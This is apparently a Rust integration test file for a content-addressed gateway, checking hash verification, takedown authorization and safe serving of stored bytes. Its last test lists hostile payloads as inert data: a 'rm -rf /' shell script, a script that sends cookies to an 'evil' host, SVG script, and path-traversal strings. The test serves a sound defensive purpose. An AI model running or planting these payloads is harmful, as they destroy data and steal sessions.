// Integration tests: a mock content origin (independent of the swarm) + the real gateway.
// Non-self-fulfilling — acquire's verification is checked against an independently-computed
// sha256, and the gateway's self-certification is checked by re-hashing what it serves.
use axum::{extract::Path, http::StatusCode, response::IntoResponse, routing::get, Router};
use csd_swarm::acquire::{acquire, sha256_hex};
use csd_swarm::gateway::{router, GwState};
use csd_swarm::store::Store;

async fn spawn(app: Router) -> String {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    format!("http://{addr}")
}

const GOOD: &[u8] = b"{\"body\":\"gm\",\"v\":1}";

// mock origin: serves correct bytes at the real hash, WRONG bytes at any other path, and a big
// blob at /big — so we can prove acquire accepts only hash-matching bytes and caps size.
async fn origin_app() -> Router {
    Router::new()
        .route(
            "/content/:h",
            get(|Path(h): Path<String>| async move {
                let want = sha256_hex(GOOD);
                if h.trim_start_matches("0x") == want {
                    (StatusCode::OK, GOOD.to_vec()).into_response()
                } else {
                    (StatusCode::OK, b"TAMPERED-DIFFERENT-BYTES".to_vec()).into_response()
                } // wrong bytes for any other hash
            }),
        )
        .route(
            "/big",
            get(|| async { (StatusCode::OK, vec![0u8; 10_000]) }),
        )
}

#[tokio::test]
async fn acquire_accepts_only_hash_matching_bytes() {
    let origin = spawn(origin_app().await).await;
    let client = reqwest::Client::new();
    let good_hash = sha256_hex(GOOD);

    // correct hash → bytes verify and are returned
    let urls = vec![format!("{origin}/content/0x{good_hash}")];
    let got = acquire(&client, &good_hash, &urls, 1 << 20).await.unwrap();
    assert_eq!(got, GOOD);

    // a DIFFERENT hash → origin returns tampered bytes → acquire MUST reject (no poisoning)
    let bogus = "ab".repeat(32);
    let urls2 = vec![format!("{origin}/content/0x{bogus}")];
    assert!(acquire(&client, &bogus, &urls2, 1 << 20).await.is_err());

    // size cap enforced (the 10k blob exceeds a 1k max)
    let urls3 = vec![format!("{origin}/big")];
    assert!(acquire(&client, &good_hash, &urls3, 1024).await.is_err());
}

#[tokio::test]
async fn gateway_self_certifies_and_handles_errors() {
    let dir = tempfile::tempdir().unwrap();
    let store = Store::open(dir.path()).await.unwrap();
    let h = sha256_hex(GOOD);
    store.put(&h, GOOD).await.unwrap();

    let gw = spawn(router(GwState {
        store,
        max_bytes: 1 << 20,
        admin_token: None,
        conns: std::sync::Arc::new(tokio::sync::Semaphore::new(64)),
    }))
    .await;
    let client = reqwest::Client::new();

    // GET held → 200, body re-hashes to the requested hash
    let r = client
        .get(format!("{gw}/content/0x{h}"))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 200);
    assert_eq!(
        r.headers().get("etag").unwrap().to_str().unwrap(),
        format!("\"0x{h}\"")
    );
    let body = r.bytes().await.unwrap();
    assert_eq!(sha256_hex(&body), h);

    // unheld → 404, bad hash → 400
    let bogus = "00".repeat(32);
    assert_eq!(
        client
            .get(format!("{gw}/content/0x{bogus}"))
            .send()
            .await
            .unwrap()
            .status(),
        404
    );
    assert_eq!(
        client
            .get(format!("{gw}/content/0xnothex"))
            .send()
            .await
            .unwrap()
            .status(),
        400
    );

    // HEAD → 200 with no body; Range → 206
    assert_eq!(
        client
            .head(format!("{gw}/content/0x{h}"))
            .send()
            .await
            .unwrap()
            .status(),
        200
    );
    let rr = client
        .get(format!("{gw}/content/0x{h}"))
        .header("Range", "bytes=0-3")
        .send()
        .await
        .unwrap();
    assert_eq!(rr.status(), 206);
    assert_eq!(rr.bytes().await.unwrap().len(), 4);

    // /health + /pins
    let health: serde_json::Value = client
        .get(format!("{gw}/health"))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(health["pinned"], 1);
}

#[tokio::test]
async fn gateway_refuses_to_serve_corrupted_store_bytes() {
    // simulate a corrupted store: bytes filed under a hash they do NOT match.
    let dir = tempfile::tempdir().unwrap();
    let store = Store::open(dir.path()).await.unwrap();
    let wrong_key = "ab".repeat(32); // != sha256(GOOD)
    assert_ne!(sha256_hex(GOOD), wrong_key);
    store.put(&wrong_key, GOOD).await.unwrap();
    let gw = spawn(router(GwState {
        store,
        max_bytes: 1 << 20,
        admin_token: None,
        conns: std::sync::Arc::new(tokio::sync::Semaphore::new(64)),
    }))
    .await;
    let client = reqwest::Client::new();
    // gateway self-check: served body must hash to the requested hash → corrupted entry → 500, never served
    let r = client
        .get(format!("{gw}/content/0x{wrong_key}"))
        .send()
        .await
        .unwrap();
    assert_eq!(r.status(), 500);
}

#[tokio::test]
async fn takedown_api_removes_content_and_blocks_redownload() {
    let dir = tempfile::tempdir().unwrap();
    let store = Store::open(dir.path()).await.unwrap();
    let h = sha256_hex(GOOD);
    store.put(&h, GOOD).await.unwrap();

    let gw = spawn(router(GwState {
        store: store.clone(),
        max_bytes: 1 << 20,
        admin_token: Some("s3cret".into()),
        conns: std::sync::Arc::new(tokio::sync::Semaphore::new(64)),
    }))
    .await;
    let client = reqwest::Client::new();

    // served before takedown
    assert_eq!(
        client
            .get(format!("{gw}/content/0x{h}"))
            .send()
            .await
            .unwrap()
            .status(),
        200
    );

    // DELETE without the token is REFUSED (content stays up)
    let no_auth = client
        .delete(format!("{gw}/content/0x{h}"))
        .send()
        .await
        .unwrap();
    assert_eq!(no_auth.status(), 403);
    assert_eq!(
        client
            .get(format!("{gw}/content/0x{h}"))
            .send()
            .await
            .unwrap()
            .status(),
        200
    );

    // DELETE WITH the token → purged + denied
    let del = client
        .delete(format!("{gw}/content/0x{h}"))
        .bearer_auth("s3cret")
        .send()
        .await
        .unwrap();
    assert_eq!(del.status(), 200);

    // now GONE on the gateway…
    assert_eq!(
        client
            .get(format!("{gw}/content/0x{h}"))
            .send()
            .await
            .unwrap()
            .status(),
        410
    );
    assert_eq!(
        client
            .head(format!("{gw}/content/0x{h}"))
            .send()
            .await
            .unwrap()
            .status(),
        410
    );
    // …and the store refuses to re-store it (so the ingest loop can't bring it back)
    assert!(store.is_denied(&h).await);
    assert!(store.put(&h, GOOD).await.is_err());
    assert!(store.has(&h).await.is_none());

    // allow it back (admin) → store can hold it again
    let allow = client
        .post(format!("{gw}/admin/allow/0x{h}"))
        .bearer_auth("s3cret")
        .send()
        .await
        .unwrap();
    assert_eq!(allow.status(), 200);
    assert!(!store.is_denied(&h).await);
    store.put(&h, GOOD).await.unwrap();
    assert_eq!(
        client
            .get(format!("{gw}/content/0x{h}"))
            .send()
            .await
            .unwrap()
            .status(),
        200
    );
}

#[tokio::test]
async fn adversarial_content_is_inert_opaque_bytes() {
    // Non-self-fulfilling proof that hostile CONTENT cannot trigger anything on a node: whatever the
    // bytes are (a script, HTML/JS, an executable, path-traversal text, a compression-bomb header,
    // control/format chars), the node only ever (a) stores them byte-identical under <sha256>.bin —
    // the content NEVER influences the filename — and (b) serves them as a non-renderable download.
    let dir = tempfile::tempdir().unwrap();
    let store = Store::open(dir.path()).await.unwrap();
    let payloads: Vec<&[u8]> = vec![
        b"#!/bin/sh\nrm -rf / --no-preserve-root\n", // a shell script
        b"\x7fELF\x02\x01\x01\x00 malicious binary", // ELF magic
        b"<html><script>fetch('//evil/'+document.cookie)</script></html>", // HTML+JS
        b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>", // SVG+JS
        b"../../../../etc/passwd",                   // traversal as CONTENT
        b"..\\..\\windows\\system32",                // windows traversal
        b"\x1f\x8b\x08\x00 gzip-bomb-header",        // gzip magic (must NOT be decompressed)
        b"%s%s%s%n%x  format string",                // format-string chars
        b"\x00\x00 null bytes \x00 and \x07 bells \x1b[2J", // null + control/ANSI
        b"{\"a\":{\"a\":{\"a\":{\"a\":\"deep\"}}}}", // nested JSON (must NOT be parsed)
        b"javascript:alert(1)",                      // js: scheme as content
    ];
    let before: std::collections::HashSet<_> = std::fs::read_dir(dir.path())
        .unwrap()
        .filter_map(|e| e.ok())
        .map(|e| e.file_name())
        .collect();

    let gw = spawn(router(GwState {
        store: store.clone(),
        max_bytes: 1 << 20,
        admin_token: None,
        conns: std::sync::Arc::new(tokio::sync::Semaphore::new(64)),
    }))
    .await;
    let client = reqwest::Client::new();

    for p in &payloads {
        let h = sha256_hex(p);
        store.put(&h, p).await.unwrap();
        // stored byte-identical, addressed ONLY by its hash
        assert_eq!(
            store.get(&h).await.unwrap(),
            *p,
            "content must round-trip byte-identical"
        );

        // served as an inert download — never an executable/renderable type
        let r = client
            .get(format!("{gw}/content/0x{h}"))
            .send()
            .await
            .unwrap();
        assert_eq!(r.status(), 200);
        let hd = r.headers();
        assert_eq!(
            hd.get("content-type").unwrap(),
            "application/json; charset=utf-8"
        );
        assert_eq!(hd.get("x-content-type-options").unwrap(), "nosniff");
        assert_eq!(hd.get("content-disposition").unwrap(), "attachment");
        assert!(hd
            .get("content-security-policy")
            .unwrap()
            .to_str()
            .unwrap()
            .contains("default-src 'none'"));
        // the served body is the exact bytes (no transformation/decompression/escaping)
        assert_eq!(r.bytes().await.unwrap().as_ref(), *p);
    }

    // CRITICAL: the only files the content created are <64-hex>.bin — no script, no traversal escape,
    // no path the content's bytes chose. (Plus whatever existed before, e.g. none.)
    for e in std::fs::read_dir(dir.path())
        .unwrap()
        .filter_map(|e| e.ok())
    {
        let name = e.file_name();
        if before.contains(&name) {
            continue;
        }
        let n = name.to_string_lossy();
        let stem = n.strip_suffix(".bin").unwrap_or(&n);
        assert!(
            n.ends_with(".bin") && stem.len() == 64 && stem.chars().all(|c| c.is_ascii_hexdigit()),
            "content must only ever create <hash>.bin files, found: {n}"
        );
    }
}
